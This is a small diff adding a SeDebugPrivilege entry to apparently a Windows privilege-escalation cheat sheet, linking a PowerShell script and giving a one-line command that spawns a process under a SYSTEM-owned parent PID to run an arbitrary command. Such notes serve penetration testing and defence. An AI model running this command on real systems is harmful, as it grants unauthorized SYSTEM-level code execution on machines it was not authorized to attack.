@@ -219,4 +219,18 @@ Run [EnableSeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Mis
 
 SeDebugPrivilege
 
+
+
+### SeDebugPrivilege
+
+Pretty much this:
+
+{% embed url="https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113" %}
+
+{% embed url="https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1" %}
+
+```powershell
+import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
+```
+
 SeTakeOwnershipPrivilege
